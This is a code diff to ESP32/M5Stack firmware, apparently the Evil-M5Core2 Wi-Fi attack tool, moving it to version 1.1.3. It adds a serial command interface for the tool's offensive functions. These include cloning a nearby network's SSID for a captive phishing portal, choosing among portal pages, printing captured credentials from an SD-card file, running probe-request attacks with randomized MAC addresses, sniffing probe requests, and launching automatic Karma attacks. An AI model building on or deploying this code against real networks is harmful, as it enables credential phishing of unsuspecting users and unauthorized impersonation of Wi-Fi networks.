@@ -37,7 +37,8 @@
 #include <vector>
 #include <string>
 #include <set>
-#include <Adafruit_NeoPixel.h>
+
+#include <Adafruit_NeoPixel.h> //led
 
 
 extern "C" {
@@ -45,7 +46,7 @@ extern "C" {
   #include "esp_system.h"
 }
 
-int ledOn = true; // change this to true to get cool led effect (only on fire)
+int ledOn = true;// change this to true to get cool led effect (only on fire)
 
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
 
@@ -168,6 +169,7 @@ void setColorRange(int startPixel, int endPixel, uint32_t color) {
 //led part end 
 
 
+bool isItSerialCommand = false;
 
 void setup() {
   M5.begin();
@@ -307,7 +309,7 @@ void setup() {
     "   Towelie's High Times.",
     "Butters Awkward Escapades.",
     "Navigating the Multiverse.",
-    "Affirmative Dave,I read you.",
+    "Affirmative Dave,\n I read you.",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -321,7 +323,9 @@ void setup() {
     Serial.println("Error..");
     Serial.println("SD card not mounted...");
   }else{
+    Serial.println("----------------------");
     Serial.println("SD card initialized !! ");
+    Serial.println("----------------------");
     restoreConfigParameter("brightness");
     drawImage("/img/startup.jpg");
     if (ledOn){
@@ -382,7 +386,7 @@ if (batteryLevel < 15) {
   M5.Display.setCursor(75, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   M5.Display.setCursor(102, textY + 45);
-  M5.Display.println("v1.1.2 2024");
+  M5.Display.println("v1.1.3 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------"); 
   M5.Display.setCursor(10, textY + 120);
@@ -437,6 +441,7 @@ if (ledOn){
     } else {
         Serial.println("SSID is empty.");
         Serial.println("Skipping Wi-Fi connection.");
+        Serial.println("----------------------");
     }
 
     pixels.begin(); // led init
@@ -471,6 +476,8 @@ void firstScanWifiNetworks() {
         numSsid = min(n, 100);
         for (int i = 0; i < numSsid; i++) {
             ssidList[i] = WiFi.SSID(i);
+            Serial.print(i); // Affiche l'indice (en commençant par 1)
+            Serial.print(": ");
             Serial.println(ssidList[i]);
         }
         Serial.println("-------------------");
@@ -482,8 +489,7 @@ void firstScanWifiNetworks() {
 
 void loop() {
   M5.update();
-  dnsServer.processNextRequest();
-  server.handleClient();
+  handleDnsRequestSerial();
   if (inMenu) {
     if (lastIndex != currentIndex) {
       drawMenu();
@@ -629,6 +635,212 @@ void drawMenu() {
 }
 
 
+void handleDnsRequestSerial(){
+      dnsServer.processNextRequest();
+      server.handleClient();
+      checkSerialCommands();
+}
+
+
+void listProbesSerial() {
+    File file = SD.open("/probes.txt", FILE_READ);
+    if (!file) {
+        Serial.println("Failed to open probes.txt");
+        return;
+    }
+
+    int probeIndex = 0;
+    Serial.println("List of Probes:");
+    while (file.available()) {
+        String probe = file.readStringUntil('\n');
+        probe.trim();
+        if (probe.length() > 0) {
+            Serial.println(String(probeIndex) + ": " + probe);
+            probeIndex++;
+        }
+    }
+    file.close();
+}
+
+void selectProbeSerial(int index) {
+    File file = SD.open("/probes.txt", FILE_READ);
+    if (!file) {
+        Serial.println("Failed to open probes.txt");
+        return;
+    }
+
+    int currentIndex = 0;
+    String selectedProbe = "";
+    while (file.available()) {
+        String probe = file.readStringUntil('\n');
+        if (currentIndex == index) {
+            selectedProbe = probe;
+            break;
+        }
+        currentIndex++;
+    }
+    file.close();
+
+    if (selectedProbe.length() > 0) {
+        clonedSSID = selectedProbe;  // Utilisez cette variable pour les opérations ultérieures
+        Serial.println("Probe selected: " + selectedProbe);
+    } else {
+        Serial.println("Probe index not found.");
+    }
+}
+
+String currentlySelectedSSID = "";
+bool isProbeAttackRunning = false;
+bool stopProbeSniffingViaSerial = false;
+bool isProbeSniffingRunning = false;
+
+void checkSerialCommands() {
+  if (Serial.available()) {
+    String command = Serial.readStringUntil('\n');
+    command.trim();
+    if (command == "scan_wifi") {
+      isOperationInProgress = true;
+      inMenu = false;
+      scanWifiNetworks();
+    } else if (command.startsWith("select_network")) {
+      int ssidIndex = command.substring(String("select_network ").length()).toInt();
+      selectNetwork(ssidIndex); 
+    } else if (command.startsWith("detail_ssid")) {
+      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
+      String security = getWifiSecurity(ssidIndex);
+      int32_t rssi = WiFi.RSSI(ssidIndex);
+      uint8_t* bssid = WiFi.BSSID(ssidIndex);
+      String macAddress = bssidToString(bssid);
+      M5.Display.display();
+      Serial.println("------Wifi-Info----");
+      Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
+      Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
+      Serial.println("Security: " + security);
+      Serial.println("Signal: " + String(rssi) + " dBm");
+      Serial.println("MAC: " + macAddress);
+      Serial.println("-------------------");
+    }else if (command == "clone_ssid") {
+      cloneSSIDForCaptivePortal(currentlySelectedSSID);
+      Serial.println("Cloned SSID : " + clonedSSID);
+    } else if (command == "start_portal") {
+      createCaptivePortal();
+    } else if (command == "stop_portal") {
+      stopCaptivePortal();
+    } else if (command == "list_portal") {
+        listPortalFiles();
+    }  else if (command.startsWith("change_portal")) {
+        int portalIndex = command.substring(String("change_portal ").length()).toInt();
+        changePortal(portalIndex);
+    } else if (command == "check_credentials") {
+        checkCredentialsSerial();
+    } else if (command == "probe_attack") {
+        isOperationInProgress = true;
+        inMenu = false;
+        isItSerialCommand = true;
+        probeAttack(); 
+        delay(200);
+    } else if (command == "stop_probe_attack") {
+        if (isProbeAttackRunning) {
+            isProbeAttackRunning = false;
+            Serial.println("Stopping probe attack...");
+        } else {
+            Serial.println("No probe attack running.");
+        }
+    } else if (command == "probe_sniffing") {
+          isOperationInProgress = true;
+          inMenu = false;
+          probeSniffing(); 
+          delay(200);
+    }  else if (command == "stop_probe_sniffing") {
+        stopProbeSniffingViaSerial = true; // Indique que l'arrêt vient du port série
+        isProbeSniffingRunning = false;
+        Serial.println("Stopping probe sniffing via serial...");
+    }else if (command == "list_probes") {
+        listProbesSerial();
+    } else if (command.startsWith("select_probes ")) {
+        int index = command.substring(String("select_probes ").length()).toInt();
+        selectProbeSerial(index);
+    } else if (command == "karma_auto") {
+          isOperationInProgress = true;
+          inMenu = false;
+          startAutoKarma();
+          delay(200);
+    }  else if (command == "help") {
+          Serial.println("Available Commands:");
+          Serial.println("scan_wifi - Scan for WiFi networks");
+          Serial.println("select_network <index> - Select a network by index for operations");
+          Serial.println("detail_ssid <index> - Show details of a specific WiFi network");
+          Serial.println("clone_ssid - Clone the selected network SSID for captive portal");
+          Serial.println("start_portal - Start the captive portal");
+          Serial.println("stop_portal - Stop the captive portal");
+          Serial.println("list_portal - List available portal files");
+          Serial.println("change_portal <index> - Change the current portal to another");
+          Serial.println("check_credentials - Check for saved credentials");
+          Serial.println("probe_attack - Start a probe request attack");
+          Serial.println("stop_probe_attack - Stop the probe request attack");
+          Serial.println("probe_sniffing - Start sniffing for probe requests");
+          Serial.println("stop_probe_sniffing - Stop sniffing for probe requests");
+          Serial.println("list_probes - List captured probe requests");
+          Serial.println("select_probes <index> - Select captured probe request by index");
+          Serial.println("karma_auto - Start an automatic karma attack that stop automaticaly when successfull");
+    } else {
+      Serial.println("Command not recognized: " + command);
+    }
+  }
+}
+
+void checkCredentialsSerial() {
+    File file = SD.open("/credentials.txt");
+    if (!file) {
+        Serial.println("Failed to open credentials file");
+        return;
+    }
+    bool isEmpty = true;
+    Serial.println("----------------------");
+    Serial.println("Credentials Found:");
+    Serial.println("----------------------");
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        if (line.length() > 0) {
+            Serial.println(line);
+            isEmpty = false;
+        }
+    }
+    file.close();
+    if (isEmpty) {
+        Serial.println("No credentials found.");
+    }
+}
+
+void changePortal(int index) {
+    File root = SD.open("/sites");
+    int currentIndex = 0;
+    String selectedFile;
+    while (File file = root.openNextFile()) {
+        if (currentIndex == index) {
+            selectedFile = String(file.name());
+            break;
+        }
+        currentIndex++;
+        file.close();
+    }
+    root.close();
+    if (selectedFile.length() > 0) {
+        Serial.println("Changing portal to: " + selectedFile);
+        selectedPortalFile = "/sites/" + selectedFile;
+    } else {
+        Serial.println("Invalid portal index");
+    }
+}
+
+void selectNetwork(int index) {
+  if (index >= 0 && index < numSsid) {
+    currentlySelectedSSID = ssidList[index];
+    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
+  } else {
+    Serial.println("Index SSID invalide.");
+  }
+}
 
 void scanWifiNetworks() {
   WiFi.mode(WIFI_STA);
@@ -650,8 +862,10 @@ void scanWifiNetworks() {
   Serial.println("Near Wifi Network : ");
   numSsid = min(n, 100);
   for (int i = 0; i < numSsid; i++) {
-    ssidList[i] = WiFi.SSID(i);
-    Serial.println(ssidList[i]);
+      ssidList[i] = WiFi.SSID(i);
+      Serial.print(i);
+      Serial.print(": ");
+      Serial.println(ssidList[i]);
   }
   Serial.println("-------------------");
   Serial.println("WiFi Scan Completed ");
@@ -681,8 +895,7 @@ void showWifiList() {
 
 while (!inMenu) {
     M5.update();
-     dnsServer.processNextRequest();
-     server.handleClient();
+     handleDnsRequestSerial();
     if (M5.BtnA.wasPressed()) {
       currentListIndex--;
       if (currentListIndex < 0) {
@@ -758,8 +971,7 @@ if (networkIndex >= 0 && networkIndex < numSsid) {
 
     while (!inMenu) {
       M5.update();
-      dnsServer.processNextRequest();
-      server.handleClient();
+      handleDnsRequestSerial();
       if (M5.BtnC.wasPressed()) {
         cloneSSIDForCaptivePortal(ssidList[networkIndex]);
         inMenu = true;
@@ -1327,12 +1539,21 @@ void stopCaptivePortal() {
 void listPortalFiles() {
     File root = SD.open("/sites");
     numPortalFiles = 0;
+    Serial.println("Available portals:");
     while (File file = root.openNextFile()) {
         if (!file.isDirectory()) {
             String fileName = file.name();
             if (fileName.endsWith(".html")) {
-                portalFiles[numPortalFiles++] = String("/sites/") + fileName;
-                if (numPortalFiles >= 30) break;
+                // Ajouter le chemin complet du fichier au tableau portalFiles
+                portalFiles[numPortalFiles] = String("/sites/") + fileName;
+
+                // Afficher le nom du fichier avec un index sur le port série
+                Serial.print(numPortalFiles);
+                Serial.print(": ");
+                Serial.println(fileName);
+
+                numPortalFiles++;
+                if (numPortalFiles >= 30) break; // Limite à 30 fichiers
             }
         }
         file.close();
@@ -1516,8 +1737,7 @@ void checkCredentials() {
 
         while (!inMenu) {
             M5.update();
-            dnsServer.processNextRequest();
-            server.handleClient();
+            handleDnsRequestSerial();
             if (M5.BtnA.wasPressed()) {
                 currentListIndex = max(0, currentListIndex - 1);
                 checkCredentials();
@@ -1630,7 +1850,7 @@ void displayMonitorPage1() {
 
   while (!inMenu) {
       M5.update();
-      dnsServer.processNextRequest();
+      handleDnsRequestSerial();
       server.handleClient();
 
       // Rafraîchir l'affichage des clients et mots de passe
@@ -1710,8 +1930,7 @@ void displayMonitorPage2() {
 
     while (!inMenu) {
         M5.update();
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
         if (M5.BtnA.wasPressed()) {
             displayMonitorPage1(); 
             break;
@@ -1791,8 +2010,7 @@ void displayMonitorPage3() {
 
   while (!inMenu) {
       M5.update();
-      dnsServer.processNextRequest();
-      server.handleClient();
+      handleDnsRequestSerial();
 
       unsigned long currentMillis = millis();
 
@@ -1850,21 +2068,29 @@ void displayMonitorPage3() {
   }
 }
 
+
+
 void probeSniffing() {
-    isProbeSniffingMode = true; 
+    isProbeSniffingMode = true;
+    isProbeSniffingRunning = true; // S'assurer que le sniffing est activé
     startScanKarma();
 
-    while (true) {
+    while (isProbeSniffingRunning) { // Utiliser la variable pour contrôler la boucle
         M5.update();
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
+
+        // Vérifier si l'arrêt provient de l'interface utilisateur
         if (M5.BtnB.wasPressed()) {
-            stopScanKarma(); 
-            break;
+            stopProbeSniffingViaSerial = false; // Assurez-vous que l'arrêt n'est pas traité comme série
+            isProbeSniffingRunning = false; // Arrêter le sniffing
         }
     }
 
-    isProbeSniffingMode = false; 
+    stopScanKarma(); 
+    isProbeSniffingMode = false;
+    if (stopProbeSniffingViaSerial) {
+        stopProbeSniffingViaSerial = false;
+    }
 }
 
 
@@ -1899,8 +2125,7 @@ void brightness() {
 
     while (true) {
         M5.update();
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
         if (M5.BtnA.wasPressed()) {
             currentBrightness = max(minBrightness, currentBrightness - 12);
             brightnessAdjusted = true;
@@ -2171,39 +2396,38 @@ void stopScanKarma() {
     Serial.println("-------------------");
     isScanningKarma = false;
     esp_wifi_set_promiscuous(false);
-    
-    if (isProbeSniffingMode) {
-      bool saveSSID = false;
-      if (ssid_count_Karma > 0){
-        saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
-      }
-      M5.Display.clear();
-        M5.Display.setCursor(50 , M5.Display.height()/ 2 );
+
+    // Si le sniffing est en mode série (commande via série), sauvegarder automatiquement sans demander de confirmation
+    if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
+        Serial.println("Saving SSIDs to SD card automatically...");
+        for (int i = 0; i < ssid_count_Karma; i++) {
+            saveSSIDToFile(ssidsKarma[i]);
+        }
+        Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
+    } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
+        // Sinon, demander une confirmation pour la sauvegarde
+        bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
         if (saveSSID) {
-            M5.Display.println("Saving SSIDs on SD..");
             for (int i = 0; i < ssid_count_Karma; i++) {
                 saveSSIDToFile(ssidsKarma[i]);
             }
-            
             M5.Display.clear();
             M5.Display.setCursor(50 , M5.Display.height()/ 2 );
             M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
             Serial.println("-------------------");
             Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
             Serial.println("-------------------");
-            
-        } else {
-            M5.Display.println("  No SSID saved.");
         }
-    delay(1000);
-    memset(ssidsKarma, 0, sizeof(ssidsKarma));
-    ssid_count_Karma = 0;
     }
 
+    // Réinitialisation des paramètres
+    memset(ssidsKarma, 0, sizeof(ssidsKarma));
+    ssid_count_Karma = 0;
     menuSizeKarma = ssid_count_Karma;
     currentIndexKarma = 0;
     menuStartIndexKarma = 0;
 
+    // Réinitialiser l'interface utilisateur
     if (ssid_count_Karma > 0) {
         drawMenuKarma();
         currentStateKarma = StopScanKarma;
@@ -2213,8 +2437,10 @@ void stopScanKarma() {
         drawMenu();
     }
 
-    isProbeSniffingMode = false; 
+    isProbeSniffingMode = false;
+    stopProbeSniffingViaSerial = false; // Réinitialiser le flag pour les commandes séries
 }
+
 
 
 void handleMenuInputKarma() {
@@ -2304,8 +2530,7 @@ void startAPWithSSIDKarma(const char* ssid) {
   
  while (true) {
         M5.update(); 
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
         currentTime = millis();
         remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
         clientCount = WiFi.softAPgetStationNum();
@@ -2414,8 +2639,7 @@ void listProbes() {
 
     while (selectedIndex == -1) {
         M5.update();
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
         bool indexChanged = false;
         if (M5.BtnA.wasPressed()) {
             currentListIndex--;
@@ -2514,8 +2738,7 @@ void deleteProbe() {
 
   while (selectedIndex == -1) {
       M5.update();
-      dnsServer.processNextRequest();
-      server.handleClient();
+      handleDnsRequestSerial();
       if (needDisplayUpdate) {
           M5.Display.clear();
           M5.Display.setTextSize(2);
@@ -2584,8 +2807,7 @@ int showProbesAndSelect(String probes[], int numProbes) {
 
     while (selectedIndex == -1) {
         M5.update();
-        dnsServer.processNextRequest();
-        server.handleClient();
+        handleDnsRequestSerial();
         if (needDisplayUpdate) {
             M5.Display.clear();
             M5.Display.setTextSize(2);
@@ -2753,16 +2975,27 @@ std::vector<String> readCustomProbes(const char* filename) {
 
 
 int checkNb = 0;
+bool useCustomProbes;
+std::vector<String> customProbes;
 
 void probeAttack() {
     WiFi.mode(WIFI_MODE_STA);
-    bool useCustomProbes = confirmPopup("Use custom probes?");
-    M5.Display.clear();
-    std::vector<String> customProbes;
-    if (useCustomProbes) {
-        customProbes = readCustomProbes("/config/config.txt"); // Remplacez par le chemin réel du fichier
-    }
+    isProbeAttackRunning = true;
+    useCustomProbes = false;
 
+    if (!isItSerialCommand){
+        useCustomProbes = confirmPopup("Use custom probes?");
+        M5.Display.clear();
+        if (useCustomProbes) {
+            customProbes = readCustomProbes("/config/config.txt");
+        } else {
+            customProbes.clear(); 
+        }
+    } else {
+        M5.Display.clear();
+        isItSerialCommand = false;
+        customProbes.clear();
+    }
     int probeCount = 0;
     int delayTime = 500; // initial probes delay
     unsigned long previousMillis = 0;
@@ -2785,9 +3018,9 @@ void probeAttack() {
     Serial.println("Starting Probe Attack");
     Serial.println("-------------------");
     
-    while (true) {
+    while (isProbeAttackRunning) {
         unsigned long currentMillis = millis();
-
+        handleDnsRequestSerial();
         if (currentMillis - previousMillis >= delayTime) {
             previousMillis = currentMillis;
             setRandomMAC();
@@ -2832,13 +3065,15 @@ void probeAttack() {
           delayTime = min(1000, delayTime + 100); // max delay
       }
       if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
-          break;
+          isProbeAttackRunning = false;
       }
+
   }
   Serial.println("-------------------");
   Serial.println("Stopping Probe Attack");
   Serial.println("-------------------");
   restoreOriginalWiFiSettings();
+  useCustomProbes = false;
   inMenu = true;
   drawMenu(); 
 }
@@ -3042,8 +3277,7 @@ void activateAPForAutoKarma(const char* ssid) {
 
   while (millis() - startTime < autoKarmaAPDuration) {
       displayAPStatus(ssid, startTime, autoKarmaAPDuration);
-      dnsServer.processNextRequest();
-      server.handleClient();
+      handleDnsRequestSerial();
 
       M5.update();
 
@@ -3087,7 +3321,7 @@ void activateAPForAutoKarma(const char* ssid) {
   Serial.println("-------------------");
   Serial.println("Karma Fail for : " + String(ssid));
   Serial.println("-------------------");
-  if (ledOn){
+    if (ledOn){
     pixels.setPixelColor(0, pixels.Color(0,0,0)); 
     pixels.setPixelColor(9, pixels.Color(0,0,0)); 
     pixels.show(); 
